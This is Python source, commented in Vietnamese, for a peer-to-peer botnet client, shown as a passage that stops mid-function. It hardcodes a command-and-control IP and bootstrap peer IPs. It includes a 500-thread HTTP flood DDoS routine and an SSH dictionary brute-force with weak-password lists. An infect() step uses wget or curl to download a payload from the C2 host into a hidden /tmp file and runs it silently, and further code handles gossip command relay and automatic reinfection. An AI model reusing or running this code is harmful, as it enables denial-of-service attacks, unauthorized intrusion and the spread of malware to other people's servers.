#!/usr/bin/env python3
"""
Botnet Client - Kiến trúc P2P (Peer-to-Peer) ưu tiên
=====================================================
Luồng hoạt động chính:
  1. Server C2 (Command & Control) đẩy lệnh xuống một vài bot "hạt giống" (seed bot)
  2. Các seed bot nhận lệnh rồi lan truyền (gossip) sang các peer khác
  3. Lệnh lan dần ra toàn bộ mạng botnet mà không cần mọi bot kết nối trực tiếp tới C2

Ưu điểm của mô hình P2P:
  - Không có điểm chết duy nhất (single point of failure): nếu C2 bị sập, các bot vẫn
    trao đổi lệnh với nhau qua gossip
  - Khó bị phát hiện hơn: lưu lượng phân tán giữa các peer thay vì tập trung về 1 IP
"""

# ====================================================================================
# IMPORT THƯ VIỆN
# ====================================================================================

import socket       # Tạo kết nối mạng TCP/UDP (dùng cho tấn công, P2P, quét port)
import json         # Mã hóa/giải mã dữ liệu JSON (định dạng trao đổi lệnh giữa các bot)
import time         # Xử lý thời gian (đặt timer, sleep giữa các vòng lặp)
import threading    # Tạo đa luồng (chạy song song nhiều tác vụ: lắng nghe, quét, tấn công)
import queue        # Hàng đợi an toàn đa luồng (chứa lệnh chờ xử lý)
import random       # Tạo số ngẫu nhiên (xáo trộn danh sách peer, chọn path ngẫu nhiên)
import os           # Thao tác hệ điều hành (xóa file, lấy đường dẫn, thoát tiến trình)
import sys          # Thông tin hệ thống (lấy đường dẫn script đang chạy, tham số dòng lệnh)
import uuid         # Tạo định danh duy nhất (UUID) cho bot
import hashlib      # Hàm băm MD5 (tạo bot ID từ thông tin máy)
import base64       # Mã hóa/giải mã Base64 (xử lý chữ ký số)

# Thư viện tùy chọn: paramiko - thư viện SSH cho Python
# Dùng để kết nối SSH vào các máy mục tiêu nhằm lây nhiễm bot
try:
    import paramiko
    HAS_PARAMIKO = True     # Đánh dấu: máy này CÓ thể brute-force SSH
except ImportError:
    HAS_PARAMIKO = False    # Đánh dấu: máy này KHÔNG có paramiko → bỏ qua chức năng SSH

# Thư viện tùy chọn: PyNaCl - thư viện mật mã học
# Dùng để xác thực chữ ký Ed25519 trên các lệnh từ C2
# → Đảm bảo chỉ botmaster mới có thể ra lệnh, không ai giả mạo được
try:
    from nacl.signing import VerifyKey       # Đối tượng xác thực khóa công khai
    from nacl.exceptions import BadSignature  # Ngoại lệ khi chữ ký không hợp lệ
    HAS_NACL = True     # Đánh dấu: máy này CÓ thể xác thực chữ ký
except ImportError:
    HAS_NACL = False    # Đánh dấu: không có PyNaCl → chấp nhận mọi lệnh (không an toàn)


# ====================================================================================
# CẤU HÌNH (CONFIG)
# Các hằng số điều khiển hành vi của bot - thay đổi ở đây sẽ ảnh hưởng toàn bộ chương trình
# ====================================================================================

C2_IP = "209.97.166.150"    # Địa chỉ IP của server điều khiển trung tâm (C2)
                             # Bot sẽ tải payload từ đây khi lây nhiễm máy mới
P2P_PORT = 9999             # Cổng UDP dùng cho giao tiếp P2P giữa các bot
                             # Mỗi bot lắng nghe trên cổng này để nhận lệnh và PING

# Khóa công khai Ed25519 của botmaster (dạng hex)
# Được dùng để xác minh rằng lệnh nhận được thực sự đến từ chủ sở hữu botnet
# Chỉ người giữ khóa bí mật tương ứng mới có thể tạo ra chữ ký hợp lệ
MASTER_PUBLIC_KEY = "235664217084a35a56e8f9a32fd9215607366e54d9c94d10ee21e33dd4638592"
REQUIRE_SIGNATURE = True    # Bật/tắt yêu cầu xác thực chữ ký (True = bắt buộc xác thực)

# Danh sách các peer khởi tạo (bootstrap peers)
# Khi bot mới khởi động, nó sẽ liên lạc với các IP này trước để:
#   - Đồng bộ lệnh mới nhất (pull_from_peers)
#   - Xây dựng danh sách peer ban đầu
BOOTSTRAP_PEERS = [
    ("209.97.160.87", P2P_PORT),    # VPS 1
    ("167.71.209.10", P2P_PORT),    # VPS 2
    ("152.42.222.108", P2P_PORT),   # VPS 3
]

# Danh sách IP mục tiêu để quét và lây nhiễm
# Scanner sẽ liên tục kiểm tra các IP này, nếu chưa có bot chạy → brute-force SSH → cài bot
TARGET_VPS_LIST = [
    "209.97.160.87",
    "167.71.209.10",
    "152.42.222.108",
]

PEER_CHECK_INTERVAL = 30    # Khoảng cách giữa mỗi lần kiểm tra sức khỏe peer (giây)
PEER_DEAD_THRESHOLD = 3     # Số lần PING thất bại liên tiếp trước khi coi peer là "chết"
PEER_TIMEOUT = 5            # Thời gian chờ phản hồi PONG tối đa (giây)

SSH_PORT = 22               # Cổng SSH mặc định để brute-force
# Danh sách username phổ biến để thử đăng nhập SSH
USERNAMES = ["root", "admin", "ubuntu", "user", "guest"]
# Danh sách mật khẩu phổ biến/yếu để thử (dictionary attack)
PASSWORDS = [
    "123456", "password", "root", "admin", "toor",
    "ubuntu", "km=Mtht12345vu", "P@ssw0rd",
]


# ====================================================================================
# BIẾN TOÀN CỤC (GLOBALS)
# Các biến dùng chung giữa nhiều luồng (thread) - cần cẩn thận với race condition
# ====================================================================================

CMD_QUEUE = queue.Queue()   # Hàng đợi lệnh: khi lệnh mới đến (từ P2P hoặc C2), nó được
                             # đẩy vào đây. command_processor sẽ lấy ra và thực thi.

CMD_REF = {"version": 0, "cmd": {"type": "WAIT"}}
# Tham chiếu lệnh hiện tại:
#   - "version": số phiên bản lệnh (tăng dần), dùng để biết lệnh nào mới hơn
#   - "cmd": nội dung lệnh hiện tại (mặc định là WAIT = không làm gì)
# Khi nhận lệnh mới có version cao hơn → cập nhật CMD_REF và đẩy vào CMD_QUEUE

CMD_LOCK = threading.Lock()     # Khóa mutex bảo vệ CMD_REF khỏi race condition
                                 # (nhiều luồng có thể đọc/ghi CMD_REF cùng lúc)

ATTACK_THREADS = []             # Danh sách các luồng tấn công đang chạy
                                 # Dùng để quản lý và dừng tấn công khi cần

STOP_FLAG = threading.Event()   # Cờ dừng tấn công: khi set() → tất cả worker tấn công
                                 # sẽ kiểm tra cờ này và tự dừng lại

PEER_STATUS = {}    # Dict theo dõi trạng thái các peer đã biết
                     # Format: {ip_string: {"port": int, "fails": int}}
                     # "fails" = số lần PING thất bại liên tiếp

REINFECT_IN_PROGRESS = set()    # Tập hợp các IP đang trong quá trình tái lây nhiễm
                                 # Tránh tạo nhiều luồng reinfect cho cùng 1 IP

REINFECT_LOCK = threading.Lock()  # Khóa mutex bảo vệ REINFECT_IN_PROGRESS


def get_bot_id():
    """Tạo ID duy nhất cho bot dựa trên thông tin phần cứng của máy.

    Cách hoạt động:
      - Lấy tên máy (hostname) qua platform.node()
      - Lấy địa chỉ MAC qua uuid.getnode()
      - Kết hợp 2 giá trị, băm MD5, lấy 12 ký tự đầu làm ID
      - Nếu thất bại (ví dụ: thiếu thư viện) → tạo UUID ngẫu nhiên

    Mục đích: Mỗi bot có ID riêng biệt, giúp botmaster phân biệt các bot
    và tránh xử lý trùng lặp khi gossip lệnh.
    """
    try:
        import platform
        return hashlib.md5(f"{platform.node()}-{uuid.getnode()}".encode()).hexdigest()[:12]
    except:
        return str(uuid.uuid4())[:12]

BOT_ID = get_bot_id()   # Tạo ID ngay khi module được import


# ====================================================================================
# XÁC THỰC MẬT MÃ (CRYPTO)
# Đảm bảo chỉ lệnh từ botmaster (người giữ khóa bí mật) mới được thực thi
# ====================================================================================

def verify_command(cmd_dict):
    """Xác thực chữ ký Ed25519 trên một lệnh.

    Tham số:
      cmd_dict (dict): Lệnh cần xác thực, chứa các trường như "type", "target",
                       và đặc biệt là "signature" (chữ ký Base64)

    Luồng xử lý:
      1. Nếu tắt yêu cầu chữ ký hoặc thiếu thư viện NaCl → chấp nhận luôn
      2. Lấy trường "signature" ra, giải mã Base64 thành bytes
      3. Tách phần nội dung lệnh (không gồm signature) → chuyển thành JSON → encode
      4. Dùng MASTER_PUBLIC_KEY để xác minh: nội dung + chữ ký có khớp không
      5. Khớp → True (lệnh hợp lệ), không khớp → False (lệnh bị từ chối)

    Trả về:
      True nếu lệnh hợp lệ, False nếu giả mạo hoặc thiếu chữ ký
    """
    if not REQUIRE_SIGNATURE or not HAS_NACL:
        return True     # Bỏ qua xác thực nếu tính năng bị tắt hoặc thiếu thư viện
    try:
        sig_b64 = cmd_dict.get("signature")
        if not sig_b64:
            return False    # Lệnh không có chữ ký → từ chối
        sig = base64.b64decode(sig_b64)     # Giải mã chữ ký từ Base64 sang bytes

        # Tạo lại nội dung gốc của lệnh (loại bỏ trường signature)
        body = {k: v for k, v in cmd_dict.items() if k != "signature"}
        msg = json.dumps(body, sort_keys=True).encode()  # sort_keys đảm bảo thứ tự nhất quán

        # Xác minh: nội dung msg + chữ ký sig có khớp với MASTER_PUBLIC_KEY không
        VerifyKey(bytes.fromhex(MASTER_PUBLIC_KEY)).verify(msg, sig)
        return True     # Chữ ký hợp lệ → lệnh đáng tin cậy
    except (BadSignature, Exception):
        return False    # Chữ ký sai hoặc lỗi khác → từ chối lệnh


# ====================================================================================
# TẤN CÔNG (ATTACK) - HTTP Flood DDoS
# Phương pháp: Gửi hàng loạt HTTP GET request để làm quá tải server mục tiêu
# ====================================================================================

def http_flood(target_ip, target_port, duration, stop_flag):
    """Tấn công DDoS bằng HTTP GET flood.

    Tham số:
      target_ip (str):      IP của server mục tiêu cần tấn công
      target_port (int):    Cổng web của mục tiêu (thường là 80 hoặc 443)
      duration (int):       Thời gian tấn công tính bằng giây
      stop_flag (Event):    Cờ threading.Event - khi được set() thì dừng tấn công

    Cách hoạt động:
      1. Tạo 500 luồng worker chạy song song
      2. Mỗi worker liên tục mở kết nối TCP → gửi HTTP GET → đóng → lặp lại
      3. Dừng khi: hết thời gian HOẶC stop_flag được set
      4. Kết quả: server mục tiêu bị quá tải bởi hàng nghìn request/giây
         → cạn kiệt CPU, RAM, bandwidth → không phục vụ được user thật
    """
    print(f"[ATK] HTTP Flood → {target_ip}:{target_port} ({duration}s)")
    end = time.time() + duration    # Tính mốc thời gian kết thúc tấn công
    sent = [0]                       # Đếm số request đã gửi (dùng list thay vì int
                                     # vì int không thể thay đổi từ bên trong hàm con)
    paths = ["/", "/index.html"]     # Danh sách đường dẫn URL để request ngẫu nhiên

    def worker():
        """Hàm worker chạy trong mỗi luồng - liên tục gửi HTTP request."""
        while time.time() < end and not stop_flag.is_set():
            # Tạo socket TCP mới cho mỗi request (Connection: close)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)     # Timeout 3 giây cho mỗi kết nối
            try:
                s.connect((target_ip, target_port))     # Kết nối TCP tới mục tiêu
                path = random.choice(paths)              # Chọn ngẫu nhiên đường dẫn

                # Tạo HTTP request giả dạng trình duyệt thông thường
                req = (
                    f"GET {path} HTTP/1.1\r\n"           # Dòng request
                    f"Host: {target_ip}\r\n"             # Header Host (bắt buộc HTTP/1.1)
                    "User-Agent: Mozilla/5.0\r\n"        # Giả dạng trình duyệt Firefox/Chrome
                    "Accept: */*\r\n"                    # Chấp nhận mọi loại nội dung
                    "Connection: close\r\n\r\n"          # Đóng kết nối sau response
                )
                s.send(req.encode())    # Gửi request đi
                s.recv(1)               # Nhận 1 byte phản hồi (đủ để biết server đã xử lý)
                sent[0] += 1            # Tăng bộ đếm request thành công
            except:
                pass    # Bỏ qua mọi lỗi (timeout, connection refused, v.v.)
            finally:
                s.close()   # QUAN TRỌNG: luôn đóng socket để tránh rò rỉ file descriptor
                            # Nếu không đóng → hệ thống hết fd → bot tự chết

    # Khởi tạo và chạy 500 luồng tấn công song song
    threads = []
    for _ in range(500):
        t = threading.Thread(target=worker, daemon=True)    # daemon=True: tự chết khi main thread thoát
        t.start()
        threads.append(t)

    # Chờ tất cả luồng hoàn thành (khi hết duration hoặc stop_flag được set)
    for t in threads:
        t.join()
    print(f"[ATK] HTTP done. {sent[0]} requests.")


# ====================================================================================
# QUÉT VÀ LÂY NHIỄM (SCANNER + INFECT)
# Tự động tìm máy có SSH yếu → brute-force mật khẩu → cài bot lên máy đó
# ====================================================================================

def get_my_ip():
    """Lấy địa chỉ IP hiện tại của máy đang chạy bot.

    Cách hoạt động:
      - Tạo socket UDP kết nối tới Google DNS (8.8.8.8)
      - Không thực sự gửi dữ liệu, chỉ dùng để hệ điều hành chọn interface mạng
      - Lấy IP từ socket đó → đây là IP "thật" của máy trên mạng

    Trả về:
      str: Địa chỉ IP (ví dụ: "192.168.1.100") hoặc None nếu lỗi
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))      # Kết nối giả (UDP không cần handshake)
        ip = s.getsockname()[0]          # Lấy IP của interface được chọn
        s.close()
        return ip
    except:
        return None


def ssh_brute_force(ip, port=SSH_PORT):
    """Tấn công dò mật khẩu SSH (dictionary attack) vào một IP.

    Tham số:
      ip (str):     Địa chỉ IP mục tiêu
      port (int):   Cổng SSH (mặc định 22)

    Cách hoạt động:
      1. Kiểm tra nhanh xem cổng SSH có mở không (connect_ex)
      2. Nếu mở → thử lần lượt tất cả tổ hợp username/password
      3. Nếu đăng nhập thành công → trả về kết nối SSH đang mở
      4. Nếu tất cả đều sai → trả về None

    Trả về:
      tuple (username, password, SSHClient) nếu thành công
      None nếu thất bại hoặc không thể kết nối
    """
    if not HAS_PARAMIKO:
        return None     # Không có thư viện SSH → không thể brute-force

    # Bước 1: Kiểm tra nhanh cổng SSH có mở không
    # (Tránh lãng phí thời gian thử mật khẩu nếu cổng đóng)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        if s.connect_ex((ip, port)) != 0:   # connect_ex trả về 0 nếu thành công
            s.close()
            return None     # Cổng đóng → bỏ qua IP này
        s.close()
    except:
        return None

    # Bước 2: Thử lần lượt tất cả tổ hợp username + password
    for user in USERNAMES:
        for pw in PASSWORDS:
            c = paramiko.SSHClient()
            c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            # AutoAddPolicy: tự động chấp nhận host key mới
            # (bình thường SSH sẽ hỏi xác nhận khi kết nối lần đầu)
            try:
                # Thử đăng nhập với timeout ngắn để không bị treo
                c.connect(ip, port=port, username=user, password=pw,
                          timeout=3, banner_timeout=3, auth_timeout=3)
                print(f"[SCAN] HIT {ip} → {user}:{pw}")    # Đăng nhập thành công!
                return (user, pw, c)    # Trả về kết nối SSH đang mở để dùng tiếp

            except paramiko.AuthenticationException:
                c.close()       # Sai mật khẩu → thử tổ hợp tiếp theo
                continue
            except paramiko.SSHException:
                c.close()       # Lỗi giao thức SSH (server từ chối, v.v.)
                continue
            except socket.timeout:
                c.close()       # Quá thời gian chờ → server chậm
                continue
            except socket.error:
                c.close()       # Lỗi mạng nghiêm trọng → ngừng thử IP này hoàn toàn
                return None
            except:
                c.close()       # Lỗi khác không xác định → thử tiếp
                continue
    return None     # Đã thử hết tất cả tổ hợp mà không thành công


def infect(ip, user, pw, ssh_client):
    """Lây nhiễm bot lên máy mục tiêu qua kết nối SSH đã có.

    Tham số:
      ip (str):             IP mục tiêu (dùng cho log)
      user (str):           Username đã đăng nhập thành công
      pw (str):             Password đã đăng nhập thành công
      ssh_client (SSHClient): Kết nối SSH đang mở tới máy mục tiêu

    Quy trình lây nhiễm:
      1. cd /tmp                        → Chuyển tới thư mục tạm
      2. wget hoặc curl                 → Tải bot binary từ server C2
         - File được lưu với tên ".s" (tên ẩn, bắt đầu bằng dấu chấm)
         - 2>/dev/null: ẩn output lỗi
      3. chmod +x .s                    → Cấp quyền thực thi
      4. nohup ./.s >/dev/null 2>&1 &   → Chạy bot ở chế độ nền
         - nohup: không bị kill khi đóng SSH session
         - >/dev/null 2>&1: ẩn toàn bộ output
         - &: chạy ngầm (background)
    """
    try:
        cmd = (
            "cd /tmp && "
            f"(wget -q http://{C2_IP}/bot -O .s 2>/dev/null || "    # Thử wget trước
            f"curl -s http://{C2_IP}/bot -o .s 2>/dev/null) && "    # Nếu không có wget → dùng curl
            "chmod +x .s && "                                         # Cấp quyền thực thi
            "nohup ./.s >/dev/null 2>&1 &\n"    # Chạy bot ngầm, tách khỏi SSH session
        )
        # exec_command: thực thi lệnh shell trên máy từ xa
        stdin, stdout, stderr = ssh_client.exec_command(cmd, timeout=60)
        # recv_exit_status: chờ lệnh hoàn thành (wget/curl tải xong + bot được khởi động)
        stdout.channel.recv_exit_status()
        print(f"[INFECT] → {ip}")
    except Exception as e:
        print(f"[INFECT] Error {ip}: {e}")
    finally:
        ssh_client.close()      # Luôn đóng kết nối SSH sau khi xong


def is_bot_alive(ip):
    """Kiểm tra xem IP đã có bot đang chạy chưa.

    Cách kiểm tra: Gửi PING UDP tới cổng P2P (9999)
      - Nếu nhận được PONG → bot đang hoạt động → không cần lây nhiễm lại
      - Nếu timeout/lỗi → không có bot → cần lây nhiễm

    Trả về: True nếu bot đang sống, False nếu không
    """
    return ping_peer(ip, P2P_PORT)


def scanner_loop():
    """Vòng lặp quét liên tục, tìm và lây nhiễm các máy trong danh sách mục tiêu.

    Luồng hoạt động (lặp vô hạn, mỗi 15 giây/vòng):
      1. Duyệt qua từng IP trong TARGET_VPS_LIST
      2. Bỏ qua IP của chính mình (tránh tự lây nhiễm)
      3. Bỏ qua IP đã có bot chạy (is_bot_alive)
      4. Với IP còn lại → brute-force SSH
      5. Nếu thành công → tạo luồng mới để lây nhiễm (không block vòng lặp chính)
    """
    my_ip = get_my_ip()     # Lấy IP của máy mình để bỏ qua
    while True:
        for ip in TARGET_VPS_LIST:
            if ip == my_ip:
                continue        # Bỏ qua chính mình
            if is_bot_alive(ip):
                continue        # Bot đã có trên IP này → bỏ qua
            result = ssh_brute_force(ip)    # Thử dò mật khẩu SSH
            if result:
                user, pw, client = result
                # Tạo luồng riêng để lây nhiễm (không block scanner)
                threading.Thread(target=infect, args=(ip, user, pw, client), daemon=True).start()
        time.sleep(15)      # Nghỉ 15 giây trước khi quét lại


# ====================================================================================
# DỊCH VỤ P2P (Peer-to-Peer)
# Giao thức trao đổi lệnh giữa các bot qua UDP
# Các loại tin nhắn:
#   - PING/PONG:    kiểm tra bot còn sống không
#   - GOSSIP:       lan truyền lệnh mới từ bot này sang bot khác
#   - C2_PUSH:      lệnh trực tiếp từ server C2
#   - GET_CMD:      hỏi peer gửi lệnh hiện tại (đồng bộ khi mới khởi động)
#   - CMD_RES:      phản hồi GET_CMD, chứa lệnh hiện tại và version
# ====================================================================================

def gossip_to_all(cmd_ref, skip_ip=None):
    """Lan truyền (gossip) lệnh hiện tại tới tất cả peer đã biết.

    Tham số:
      cmd_ref (dict):   Tham chiếu lệnh cần lan truyền {"version": int, "cmd": dict}
      skip_ip (str):    IP nguồn gửi lệnh gốc → bỏ qua để tránh gửi ngược lại

    Cách hoạt động:
      1. Nếu lệnh hiện tại là WAIT → không gossip (không có gì để lan truyền)
      2. Đóng gói lệnh thành JSON với type="GOSSIP"
      3. Xáo trộn danh sách peer (tránh luôn gửi theo thứ tự cố định)
      4. Gửi UDP tới từng peer (bỏ qua nguồn gốc skip_ip)
    """
    if cmd_ref["cmd"].get("type") == "WAIT":
        return      # Lệnh WAIT = không có lệnh thực sự → không cần gossip

    # Đóng gói tin nhắn GOSSIP
    msg = json.dumps({
        "type": "GOSSIP",                   # Loại tin nhắn
        "version": cmd_ref["version"],       # Phiên bản lệnh (để peer biết mới hay cũ)
        "payload": cmd_ref["cmd"],           # Nội dung lệnh thực tế
        "from": BOT_ID,                      # ID của bot gửi
    }).encode()

    # Lọc bỏ peer nguồn (tránh gửi ngược lại cho người đã gửi cho mình)
    targets = [(ip, st) for ip, st in PEER_STATUS.items() if ip != skip_ip]
    random.shuffle(targets)     # Xáo trộn để phân tán tải

    for ip, st in targets:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(1)
            sock.sendto(msg, (ip, st.get("port", P2P_PORT)))   # Gửi UDP
            sock.close()
        except:
            pass    # Bỏ qua lỗi gửi (peer có thể đã chết)

    print(f"[P2P] Gossiped to {len(targets)} peers")


def pull_from_peers(cmd_ref):
    """Đồng bộ lệnh từ các peer khi bot vừa khởi động.

    Mục đích: Bot mới khởi động có thể đã bỏ lỡ lệnh trong lúc offline.
    Hàm này hỏi từng peer: "Lệnh hiện tại của mày là gì?" và cập nhật nếu
    peer có version mới hơn.

    Tham số:
      cmd_ref (dict): Tham chiếu lệnh hiện tại của bot {"version": int, "cmd": dict}

    Luồng xử lý:
      1. Chờ 2 giây để peer_health_monitor kịp khởi tạo PEER_STATUS
      2. Gửi GET_CMD tới từng peer
      3. Nếu peer phản hồi CMD_RES với version cao hơn → xác thực chữ ký → cập nhật
      4. Dừng ngay khi đồng bộ thành công từ 1 peer (đã có lệnh mới nhất)

    Trả về: True nếu đồng bộ thành công, False nếu không peer nào có lệnh mới
    """
    time.sleep(2)   # Chờ peer_health_monitor init PEER_STATUS trước
    msg = json.dumps({"type": "GET_CMD"}).encode()

    for ip, st in list(PEER_STATUS.items()):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(3)
            sock.sendto(msg, (ip, st.get("port", P2P_PORT)))   # Gửi yêu cầu GET_CMD
            data, _ = sock.recvfrom(4096)                        # Chờ phản hồi
            sock.close()

            resp = json.loads(data.decode())
            # Kiểm tra: phản hồi CMD_RES và version mới hơn lệnh hiện tại?
            if resp.get("type") == "CMD_RES" and resp.get("version", 0) > cmd_ref["version"]:
                payload = resp["payload"]
                if verify_command(payload):     # Xác thực chữ ký trước khi chấp nhận
                    with CMD_LOCK:              # Khóa mutex để tránh race condition
                        if resp["version"] > cmd_ref["version"]:    # Kiểm tra lại sau khi lock
                            print(f"[P2P] Synced v{resp['version']} from {ip}")
                            cmd_ref["version"] = resp["version"]
                            cmd_ref["cmd"] = payload
                            CMD_QUEUE.put(payload)      # Đẩy lệnh vào hàng đợi xử lý
                            return True
        except:
            pass    # Peer không phản hồi → thử peer tiếp theo
    return False


def ping_peer(ip, port):
    """Gửi PING UDP và chờ PONG để kiểm tra peer còn sống không.

    Tham số:
      ip (str):     IP của peer cần kiểm tra
      port (int):   Cổng P2P của peer

    Cách hoạt động:
      1. Gửi tin nhắn {"type": "PING"} qua UDP
      2. Chờ phản hồi trong PEER_TIMEOUT giây
      3. Nếu nhận được {"type": "PONG"} → peer sống → return True
      4. Nếu timeout hoặc lỗi → peer chết → return False

    Trả về: True nếu peer phản hồi PONG, False nếu không
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(PEER_TIMEOUT)
        sock.sendto(json.dumps({"type": "PING"}).encode(), (ip, port))
        data, _ = sock.recvfrom(1024)
        sock.close()
        return json.loads(data.decode()).get("type") == "PONG"
    except:
        return False


def reinfect_peer(ip):
    """Tái lây nhiễm một peer đã chết (không phản hồi PING).

    Tham số:
      ip (str): IP của peer cần tái lây nhiễm

    Luồng xử lý:
      1. Kiểm tra lại lần cuối xem peer có thực sự chết không (is_bot_alive)
         (Có thể peer đã hồi sinh trong lúc chờ)
      2. Nếu vẫn chết → brute-force SSH → lây nhiễm lại
      3. Cuối cùng, dù thành công hay thất bại, xóa IP khỏi REINFECT_IN_PROGRESS
         để cho phép thử lại trong tương lai
    """
    try:
        if is_bot_alive(ip):
            return      # Peer đã hồi sinh → không cần làm gì
        result = ssh_brute_force(ip, SSH_PORT)
        if result:
            user, pw, client = result
            infect(ip, user, pw, client)    # Cài lại bot
    finally:
        # Luôn xóa IP khỏi tập "đang reinfect" (dù thành công hay thất bại)
        with REINFECT_LOCK:
            REINFECT_IN_PROGRESS.discard(ip)


def peer_health_monitor():
    """Giám sát sức khỏe tất cả peer, tự động tái lây nhiễm nếu peer chết.

    Luồng hoạt động (chạy vô hạn):
      1. Khởi tạo PEER_STATUS từ BOOTSTRAP_PEERS
      2. Mỗi PEER_CHECK_INTERVAL giây, PING từng peer
      3. Nếu peer phản hồi → reset bộ đếm fails về 0
      4. Nếu peer không phản hồi → tăng fails
      5. Khi fails >= PEER_DEAD_THRESHOLD (3 lần liên tiếp) → coi là chết
         → Tạo luồng reinfect_peer để cài lại bot
      6. Chỉ tạo 1 luồng reinfect cho mỗi IP (tránh spam)
    """
    # Khởi tạo danh sách peer từ bootstrap
    for ip, port in BOOTSTRAP_PEERS:
        PEER_STATUS[ip] = {"port": port, "fails": 0}

    while True:
        for ip, st in list(PEER_STATUS.items()):
            port = st.get("port", P2P_PORT)
            if ping_peer(ip, port):
                st["fails"] = 0     # Peer sống → reset bộ đếm
            else:
                st["fails"] += 1    # Peer không phản hồi → tăng bộ đếm
                if st["fails"] >= PEER_DEAD_THRESHOLD:
                    # Peer đã thất bại 3 lần liên tiếp → coi là chết
                    with REINFECT_LOCK:
                        if ip not in REINFECT_IN_PROGRESS:
                            # Chỉ tạo 1 luồng reinfect cho mỗi IP
                            REINFECT_IN_PROGRESS.add(ip)
                            print(f"[P2P] Peer {ip} dead → reinfecting")
                            threading.Thread(target=reinfect_peer, args=(ip,), daemon=True).start()
                    st["fails"] = 0     # Reset để không spam reinfect
        time.sleep(PEER_CHECK_INTERVAL)     # Chờ 30 giây trước vòng kiểm tra tiếp


def handle_new_command(cmd_queue, cmd_ref, payload, version, source):
    """Xử lý lệnh mới nhận được từ GOSSIP hoặc C2_PUSH.

    Tham số:
      cmd_queue (Queue):    Hàng đợi lệnh chờ xử lý
      cmd_ref (dict):       Tham chiếu lệnh hiện tại
      payload (dict):       Nội dung lệnh mới
      version (int):        Phiên bản của lệnh mới
      source (str):         IP nguồn gửi lệnh

    Luồng xử lý:
      1. Khóa CMD_LOCK (tránh race condition)
      2. Kiểm tra version mới hơn hiện tại VÀ chữ ký hợp lệ
      3. Nếu OK → cập nhật CMD_REF, đẩy lệnh vào hàng đợi
      4. Tạo luồng gossip để lan truyền lệnh tiếp cho các peer khác
         (bỏ qua source để tránh gửi ngược lại)

    Trả về: True nếu lệnh được chấp nhận, False nếu bị từ chối
    """
    with CMD_LOCK:
        if version > cmd_ref["version"] and verify_command(payload):
            print(f"[P2P] ← v{version} from {source}")
            cmd_queue.put(payload)                  # Đẩy vào hàng đợi để command_processor xử lý
            cmd_ref["version"] = version            # Cập nhật version hiện tại
            cmd_ref["cmd"] = payload                # Cập nhật nội dung lệnh
            # Lan truyền lệnh tiếp cho các peer khác (chạy trong luồng riêng)
            threading.Thread(
                target=gossip_to_all,
                args=({"version": version, "cmd": payload}, source),
                daemon=True
            ).start()
            return True
    return False


def p2p_listener(cmd_queue, cmd_ref):
    """Lắng nghe UDP - trung tâm nhận và phân phối tin nhắn P2P.

    Tham số:
      cmd_queue (Queue):    Hàng đợi lệnh chờ xử lý
      cmd_ref (dict):       Tham chiếu lệnh hiện tại

    Đây là "trái tim" giao tiếp P2P của bot. Hàm này:
      1. Bind socket UDP vào cổng P2P_PORT (9999)
         - Nếu cổng đã bị chiếm → có bot khác đang chạy → thoát
      2. Khởi động peer_health_monitor (giám sát peer) ở luồng nền
      3. Khởi động pull_from_peers (đồng bộ lệnh) ở luồng nền
      4. Vòng lặp chính: nhận tin nhắn UDP và xử lý theo loại:
         - PING       → Phản hồi PONG (xác nhận mình còn sống)
         - GET_CMD    → Gửi lại lệnh hiện tại cho peer hỏi
         - GOSSIP     → Nhận lệnh lan truyền từ peer khác
         - C2_PUSH    → Nhận lệnh trực tiếp từ C2
      5. Tự động thêm peer mới vào PEER_STATUS khi nhận được tin nhắn từ IP lạ
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.bind(("0.0.0.0", P2P_PORT))   # Lắng nghe trên tất cả interface, cổng 9999
    except OSError:
        # Cổng đã bị chiếm → một instance bot khác đang chạy → thoát để tránh xung đột
        print(f"[P2P] Port {P2P_PORT} in use → another instance running, exiting")
        os._exit(0)

    # Khởi động luồng giám sát sức khỏe peer (chạy nền)
    threading.Thread(target=peer_health_monitor, daemon=True).start()
    print(f"[P2P] Listening :{P2P_PORT}")

    # Khởi động luồng đồng bộ lệnh từ peer (chạy nền, chỉ chạy 1 lần khi khởi động)
    threading.Thread(target=pull_from_peers, args=(cmd_ref,), daemon=True).start()

    # === VÒNG LẶP CHÍNH: Nhận và xử lý tin nhắn UDP ===
    while True:
        data, addr = sock.recvfrom(4096)    # Chờ nhận tin nhắn (blocking)
        try:
            msg = json.loads(data.decode())  # Giải mã JSON
            mtype = msg.get("type")          # Lấy loại tin nhắn

            if mtype == "PING":
                # Peer hỏi "mày còn sống không?" → trả lời "còn" (PONG)
                sock.sendto(json.dumps({"type": "PONG"}).encode(), addr)

            elif mtype == "GET_CMD":
                # Peer mới khởi động, hỏi "lệnh hiện tại là gì?"
                # → gửi lại lệnh hiện tại kèm version
                resp = {"type": "CMD_RES", "version": cmd_ref["version"], "payload": cmd_ref["cmd"]}
                sock.sendto(json.dumps(resp).encode(), addr)

            elif mtype in ("GOSSIP", "C2_PUSH"):
                # Nhận lệnh mới (từ peer gossip hoặc C2 đẩy trực tiếp)
                payload = msg.get("payload", {})
                version = msg.get("version", 0)
                handle_new_command(cmd_queue, cmd_ref, payload, version, addr[0])

            # === Tự động phát hiện và thêm peer mới ===
            peer_ip = addr[0]
            if peer_ip not in PEER_STATUS:
                # IP mới chưa có trong danh sách → thêm vào để giám sát
                PEER_STATUS[peer_ip] = {"port": P2P_PORT, "fails": 0}
                print(f"[P2P] New peer: {peer_ip}")

        except:
            pass    # Bỏ qua tin nhắn không hợp lệ (JSON lỗi, v.v.)


# ====================================================================================
# PHẦN CHÍNH (MAIN)
# Khởi tạo và điều phối tất cả các thành phần của bot
# ====================================================================================

def cleanup_and_exit():
    """Tự hủy bot: dừng tấn công, xóa file thực thi, thoát tiến trình.

    Được gọi khi nhận lệnh KILL từ botmaster.
    Mục đích: Xóa sạch dấu vết của bot trên máy bị nhiễm.
    """
    STOP_FLAG.set()     # Dừng mọi tấn công đang chạy
    try:
        me = os.path.abspath(sys.argv[0])   # Đường dẫn file bot đang chạy
